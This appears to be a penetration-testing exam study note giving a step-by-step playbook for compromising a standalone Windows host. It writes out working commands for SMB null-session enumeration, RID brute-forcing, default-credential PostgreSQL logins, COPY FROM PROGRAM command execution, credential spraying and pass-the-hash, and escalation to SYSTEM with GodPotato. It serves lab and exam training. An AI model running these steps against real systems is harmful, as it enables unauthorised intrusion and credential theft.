# 🪟 Scenario 05 — Windows Multi-Service (find the weak door, reuse the key)

> **Given:** Windows standalone — `80 http`, `135/139/445 SMB`, `443 https`, `3389 RDP`, `5357 wsdapi`, `5432 postgresql`, `5985 WinRM`. No Kerberos/LDAP (88/389) → **standalone host, not a DC.** Goal: foothold → SYSTEM + proof. Fill `<placeholders>` from your own run, invent nothing.

Part of [[_MOC (Standalone Scenarios)]]. Method: [[Standalone Boxes — Exam Solve Guide]]. Services: [[HTTP]] · [[SMB]] · [[PostgreSQL]] · [[WinRM]] · [[RDP]]. Escalate: [[Windows Privilege Escalation]] · [[Credential Attacks]].

```bash
export IP=<TARGET_IP> ; mkdir -p nmap loot
```

---

## 🧠 READ THE PORTS (two themes)
1. **Three remote-shell doors share one key:** **SMB (445)**, **WinRM (5985)** and **RDP (3389)** all accept domain/local creds. So **any** credential you find *anywhere* → instant shell via `evil-winrm` / `xfreerdp` / `psexec`. **Credential reuse is the whole game.**
2. **Two strong concrete footholds besides the web:** **PostgreSQL (5432)** (default creds → RCE) and **SMB (445)** (null/guest shares → creds/files). `5357 wsdapi` is noise — ignore it.

> **Why breadth-first here:** rich surface = don't tunnel on the web. Enumerate **web + SMB + Postgres in parallel**; whichever gives the first credential or RCE wins, and that credential likely unlocks the other shells too.

---

## 1️⃣ ENUMERATE EVERYTHING (parallel)
```bash
sudo nmap -sC -sV -p80,135,139,443,445,3389,5357,5432,5985 $IP -oN nmap/services.txt
```
**SMB — null/guest first ([[SMB]]):**
```bash
nxc smb $IP -u '' -p ''                      # host/domain, signing, OS build
nxc smb $IP -u guest -p '' --shares          # readable shares without creds
smbclient -N -L //$IP/ ; smbclient -N //$IP/<share>   # browse → loot files/creds
nxc smb $IP -u guest -p '' --rid-brute        # enumerate usernames (feeds spray)
```
**PostgreSQL — try default creds ([[PostgreSQL]]):**
```bash
nxc postgres $IP -u postgres -p postgres      # also: postgres:'' , admin:admin
psql "host=$IP user=postgres password=postgres dbname=postgres"
```
**Web — fingerprint + fuzz ([[Web Enumeration]]):**
```bash
whatweb http://$IP ; whatweb https://$IP
feroxbuster -k -u https://$IP -x php,aspx,asp,txt,bak
openssl s_client -connect $IP:443 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName
```

---

## 🌿 BRANCH — whichever gives the first win

### Route A — PostgreSQL default creds → RCE (strong, often intended)
Postgres superuser can run OS commands via `COPY ... FROM PROGRAM` (v9.3+):
```sql
-- inside psql as a superuser:
DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;        -- runs as the postgres service account
```
Swap `whoami` for a PowerShell reverse-shell one-liner → shell. ([[RCE]] · [[Shells]]) The service account usually holds **`SeImpersonate`** → straight to §3.

### Route B — SMB shares → creds/files
A readable share often holds configs, scripts, backups, `unattend.xml`, or a password file → a credential → jump to Route D. Also check **MS17-010** only if the OS build is ancient (`nxc smb $IP -M ms17-010`).

### Route C — web foothold
Identify the app/version → `searchsploit`/CVE, upload, SQLi, SSTI, etc. → webshell or creds. ([[Web Exploitation]]) SQLi against a Postgres-backed app can also reach `COPY FROM PROGRAM`.

### Route D — any credential → a shell (reuse!)
The moment you hold `user:pass` (or a hash), spray it across all three doors:
```bash
nxc smb   $IP -u <user> -p '<pass>' --local-auth     # (-H <NThash> to pass-the-hash)
nxc winrm $IP -u <user> -p '<pass>'                  # "(Pwn3d!)" = evil-winrm works
evil-winrm -i $IP -u <user> -p '<pass>'              # interactive shell
xfreerdp /u:<user> /p:'<pass>' /v:$IP /cert:ignore   # GUI session
```
→ [[Credential Attacks]]. Crack any hash you find ([[Hash Cracking]]) or pass it directly.

---

## 2️⃣ ESCALATE TO SYSTEM
```cmd
whoami /priv & whoami /all & systeminfo
```
- **`SeImpersonatePrivilege`** (typical for Postgres/IIS/service accounts) → **GodPotato / PrintSpoofer → SYSTEM**.
- Else run `winPEASany.exe` / PowerUp → unquoted services · weak service perms · **AlwaysInstallElevated** · stored creds (`cmdkey /list`, PS history, saved RDP) · `SeBackup`/`SeRestore`.
→ [[Windows Privilege Escalation]]. Dump SAM/LSA and reuse everything.

---

## 🗺️ DECISION FLOW
```
enumerate web + SMB + Postgres in parallel
   ├─ Postgres default creds ──► COPY FROM PROGRAM ──► shell (service acct) ─┐
   ├─ SMB null/guest share ──► creds/files ───────────────────┐             │
   ├─ web vuln ──► webshell / creds ──────────────────────────┤             │
   │                                                          ▼             │
   │                                     any credential ──► nxc smb/winrm/rdp (reuse)
   │                                                          ▼             │
   └──────────────────────────────────────────────► shell ◄──┴─────────────┘
                                                          ▼
                                              whoami /priv
                                         ├─ SeImpersonate ─► GodPotato ─► SYSTEM ✅
                                         └─ else ─► winPEAS/PowerUp ─► SYSTEM ✅
```

## 🚧 STUCK?
1. SMB null denied → **RID-brute with `guest`** for a userlist → **spray** (check lockout).
2. Postgres `postgres:postgres` fails → try app creds from the web/SMB; look for `pg_hba`/config via LFI.
3. Got a cred that fails WinRM → try **RDP** and **SMB** with it (and `--local-auth`); try as a **hash** (PtH).
4. Re-scan all TCP; read **both** 80 and 443 (different apps?).
→ [[Standalone Boxes — Exam Solve Guide]] (Stuck section).

## 🧠 ONE-LINE LESSON
**Many services = find the one weak door (default-cred Postgres → `COPY FROM PROGRAM`, or a null-session SMB share) to get a credential, then reuse that one key across SMB/WinRM/RDP for a shell → `SeImpersonate` → GodPotato → SYSTEM.**
